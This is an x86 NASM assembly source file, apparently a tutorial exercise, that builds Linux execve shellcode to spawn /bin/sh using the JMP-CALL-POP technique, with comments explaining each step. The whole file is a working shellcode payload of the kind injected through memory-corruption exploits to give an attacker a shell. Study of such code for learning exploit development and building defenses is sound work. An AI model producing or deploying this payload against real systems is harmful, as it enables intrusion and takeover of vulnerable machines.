; Filename: execve.nasm
; Author: Kunal Pachauri
; Website: http://kunalpachauri.co.in
; Purpose: Creating Execve shellcode to execute /bin/sh

global _start

section .text
_start: 

	; Execve function : int execve(const char *filename, char *const argv[], char *const envp[]);
	; Since EAX, EBX, ECX, EDX are used to setup the syscall, we'll use ESI to setup the registers
	; To Dynamically get the address of the message string, we are using JMP-CALL-POP
	jmp short call_shellcode


shellcode:
	; At this point, ESP points to the message string
	pop esi ; Now ESI contains the message string
	
	; We now need to convert A to 0 to make /bin/sh null terminated
	xor ebx, ebx
	mov byte [esi + 7], bl ; Since offset of A is 7 and bl contains 0 so A becomes 0

	mov dword [esi + 8], esi ; Since ESI contains the address of bin bash, we are moving that address to BBBB according to the execve second parameter

	; Now to overwrite CCCC with 0 we can use the offset from ESI and use EBX as it contains 0
	mov dword [esi + 12], ebx 

	; Now setting up the required registers to make a syscall
	lea ebx, [esi]
	lea ecx, [esi + 8]
	lea edx, [esi + 12]

	; Loading the Syscall number in EAX
	xor eax, eax
	mov eax, 11
	int 0x80

call_shellcode:
	call shellcode
	message db "/bin/shABBBBCCCC"
